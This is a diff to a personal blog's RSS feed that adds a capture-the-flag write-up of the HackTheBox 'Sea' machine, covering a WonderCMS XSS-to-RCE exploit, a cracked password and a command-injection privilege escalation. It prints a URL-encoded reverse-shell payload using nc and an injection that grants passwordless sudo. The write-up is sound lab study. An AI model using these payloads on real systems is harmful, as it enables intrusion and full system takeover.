@@ -5,9 +5,291 @@
     <description>The Personal Blog of b0rgch3n | CODE: Zerberus</description>
     <link>https://b0rgch3n.github.io/</link>
     <atom:link href="https://b0rgch3n.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 26 Aug 2024 22:31:59 +0800</pubDate>
-    <lastBuildDate>Mon, 26 Aug 2024 22:31:59 +0800</lastBuildDate>
+    <pubDate>Tue, 27 Aug 2024 17:07:51 +0800</pubDate>
+    <lastBuildDate>Tue, 27 Aug 2024 17:07:51 +0800</lastBuildDate>
     <generator>Jekyll v4.3.2</generator>
+    
+      <item>
+        <title>[WriteUp] HackTheBox - Sea</title>
+        <description>&lt;p&gt;Sea is a simple box from HackTheBox’s Season 6 of 2024.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;As usual, the &lt;strong&gt;Nmap&lt;/strong&gt; scan shows open ports 22 and 80.&lt;/p&gt;
+
+&lt;p&gt;We always know that SSH won’t be the first choice,&lt;br /&gt;
+so let’s check out the web service first.&lt;/p&gt;
+
+&lt;p&gt;We browse through each page of the web service but find nothing special.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-1.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;web page&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;The only page that stands out is “&lt;strong&gt;contact.php&lt;/strong&gt;”, which has a form.&lt;br /&gt;
+Our instinct tells us that the Website field might be vulnerable to XSS or CSRF attacks.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-2.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;web page: /contact.php&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;We scan all possible directories, starting from the root directory.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-3.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;dirsearch scan: /&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;The root directory scan show four subdirectories:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;data&lt;/li&gt;
+  &lt;li&gt;messages&lt;/li&gt;
+  &lt;li&gt;plugins&lt;/li&gt;
+  &lt;li&gt;themes&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Let’s scan these four directories and their subdirectories.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-4.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;dirsearch scan: /data&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-5.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;dirsearch scan: /plugins &amp;amp; /messages&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-6.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;dirsearch scan: /themes&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Some interesting information appears under the “&lt;strong&gt;/themes/bike&lt;/strong&gt;” directory.&lt;/p&gt;
+
+&lt;p&gt;“&lt;strong&gt;/themes/bike/summary&lt;/strong&gt;” exposes the theme used by this CMS.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-7.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;web page: /themes/bike/summary&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;“&lt;strong&gt;/themes/bike/version&lt;/strong&gt;” reveals the theme version used by the CMS.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-8.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;web page: /themes/bike/version&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;“&lt;strong&gt;/themes/bike/LICENSE&lt;/strong&gt;” exposes the CMS’s copyright information,&lt;br /&gt;
+including the author’s name.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-9.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;web page: /themes/bike/LICENSE&lt;/em&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;foothold&quot;&gt;&lt;strong&gt;Foothold&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;We search for this information on GitHub and eventually identify the likely CMS through the author’s name.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-10.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;github search result&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;We suspect the CMS used here is “&lt;strong&gt;Wonder CMS&lt;/strong&gt;”.&lt;br /&gt;
+Let’s see if there’s an exploit script available for it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-11.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;github search result&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Luckily, we find a CVE that matches the version number: &lt;a href=&quot;https://github.com/insomnia-jacob/CVE-2023-41425&quot;&gt;CVE-2023-41425&lt;/a&gt;&lt;br /&gt;
+This is an exploit script that use an XSS vulnerability to achieve RCE.&lt;/p&gt;
+
+&lt;p&gt;By examining the source code,&lt;br /&gt;
+we infer that there might be a link like “&lt;strong&gt;/index.php?page=loginURL&lt;/strong&gt;”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-12.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;exploit source code&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s visit this link.&lt;/p&gt;
+
+&lt;p&gt;Yes, it exists, confirming our suspicion that the web service indeed uses “&lt;strong&gt;Wonder CMS&lt;/strong&gt;”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-13.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;web page: /index.php?page=loginURL&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;So, download and execute the exploit script.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python3 exploit.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://sea.htb/loginURL &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &amp;lt;your_ip&amp;gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &amp;lt;your_port&amp;gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; http://&amp;lt;your_ip&amp;gt;:8000/main.zip&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-14.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;run exploit script&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Enter the link provided by “&lt;strong&gt;Send the below link to admin&lt;/strong&gt;” in the suspected location.&lt;/p&gt;
+
+&lt;p&gt;Like this.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Submit the form and wait a moment.&lt;/p&gt;
+
+&lt;p&gt;Yes! It worked.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-16.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;www-data shell&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;We obtained a “&lt;strong&gt;www-data&lt;/strong&gt;” user shell.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;As we know, the “&lt;strong&gt;www-data&lt;/strong&gt;” user has very limited permissions.&lt;br /&gt;
+We need to escalate privileges.&lt;/p&gt;
+
+&lt;p&gt;Let’s explore the web file directory “&lt;strong&gt;/var/www/&lt;/strong&gt;” to look for sensitive information.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-17.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;check web files&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;The file “&lt;strong&gt;/var/www/data/database.js&lt;/strong&gt;” caught my attention.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-18.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;check database.js&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Do you see the “&lt;strong&gt;password&lt;/strong&gt;” hash? That might be the breakthrough.&lt;/p&gt;
+
+&lt;p&gt;Copy the hash locally and use “&lt;strong&gt;John&lt;/strong&gt;” to brute-force it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-19.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;crack password hash&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;We got a password!&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;mychemicalromance&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Check which users are allowed to log in.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-20.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;check passwd file&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Besides the root user, “&lt;strong&gt;amay&lt;/strong&gt;” or “&lt;strong&gt;geo&lt;/strong&gt;” might be able to login.&lt;/p&gt;
+
+&lt;p&gt;Try login by “&lt;strong&gt;amay&lt;/strong&gt;”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-21.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;user shell&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;We obtain a shell with user privileges!&lt;/p&gt;
+
+&lt;p&gt;Next, we need to escalate to root.&lt;/p&gt;
+
+&lt;p&gt;Let’s check &lt;strong&gt;sudo&lt;/strong&gt; first.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-22.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;check sudo&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;The current user amay cannot use the sudo command.&lt;/p&gt;
+
+&lt;p&gt;Upload &lt;strong&gt;linpeas.sh&lt;/strong&gt; for a comprehensive enumeration.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-23.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;SUID/SGID files&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Cross-reference the &lt;strong&gt;SUID/SGID&lt;/strong&gt; information with &lt;strong&gt;GTFObin&lt;/strong&gt;,&lt;br /&gt;
+but nothing useful turns up for now.&lt;/p&gt;
+
+&lt;p&gt;But the open ports reveal something interesting,&lt;br /&gt;
+including ports &lt;strong&gt;8080&lt;/strong&gt; and &lt;strong&gt;37309&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-24.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;active ports&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Check out port &lt;strong&gt;8080&lt;/strong&gt;, it’s also a web service.&lt;br /&gt;
+It requires authentication, we can reuse &lt;strong&gt;amay&lt;/strong&gt;’s username and password.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-25.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;other web&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;To make it easier to inspect through the browser,&lt;br /&gt;
+we forward port 8080 on the remote machine to port 8080 on our local machine.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ssh &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 8080:localhost:8080 amay@sea.htb&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Then access it via the browser, it’s a system monitoring panel.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-26.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;other web page&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;The “&lt;strong&gt;Analyze Log File&lt;/strong&gt;” feature allows access to log files with root permissions.&lt;/p&gt;
+
+&lt;p&gt;After some testing,&lt;br /&gt;
+we find that modifying the “&lt;strong&gt;log_file&lt;/strong&gt;” parameter enables arbitrary file reading.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-27.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;test log_file&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-28.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;result of test log_file&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Further testing the “&lt;strong&gt;log_file&lt;/strong&gt;” parameter with &lt;strong&gt;BurpSuite&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-29.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;test sep&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;The parameter value can’t end with a “&lt;strong&gt;;&lt;/strong&gt;” symbol.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-30.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;test sep&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;But it can end with “&lt;strong&gt;+#&lt;/strong&gt;” (where “+” is URL-encoded as a space).&lt;/p&gt;
+
+&lt;p&gt;Test modifying the parameter value to point to two different file paths.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/etc/passwd+/etc/hosts+#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;It still works, leading us to suspect that the web application might be using a tool like “cat” to read files.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-31.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;test double file&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Test again,&lt;br /&gt;
+modifying the parameter value to include a command injection.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/etc/passwd+%26%26+id+#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-32.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;test command inject&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;The command injection was successful.&lt;/p&gt;
+
+&lt;p&gt;OK, let’s modify the payload to execute a reverse shell.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/etc/passwd+%26%26+rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.16.5%2014444%20%3E%2Ftmp%2Ff%3Bsleep+60+#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-33.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;try get shell&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;It worked, but the connection dropped shortly after.&lt;/p&gt;
+
+&lt;p&gt;We might need another method to gain a persistent root session.&lt;br /&gt;
+I have a new idea: “&lt;strong&gt;Give amay sudo privileges&lt;/strong&gt;”.&lt;/p&gt;
+
+&lt;p&gt;Update the payload to modify the &lt;strong&gt;sudoers&lt;/strong&gt; file.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/etc/passwd+%26%26+echo+&lt;span class=&quot;s2&quot;&gt;&quot;amay+ALL=(ALL)+NOPASSWD:+ALL&quot;&lt;/span&gt;+&amp;gt;+/etc/sudoers.d/amay+#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-34.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;try edit sudoer&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;The amay user executes the sudo command, it worked!&lt;/p&gt;
+
+&lt;p&gt;This is the final step: we obtain a root shell through the sudo command!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-35.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;root shell&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;:)&lt;/p&gt;
+
+</description>
+        <pubDate>Mon, 26 Aug 2024 15:21:00 +0800</pubDate>
+        <link>https://b0rgch3n.github.io/2024/08/26/writeup-hackthebox-sea/</link>
+        <guid isPermaLink="true">https://b0rgch3n.github.io/2024/08/26/writeup-hackthebox-sea/</guid>
+        
+        <category>WriteUp</category>
+        
+        <category>Hack The Box</category>
+        
+        
+      </item>
     
       <item>
         <title>[WriteUp] HackTheBox - BoardLight</title>
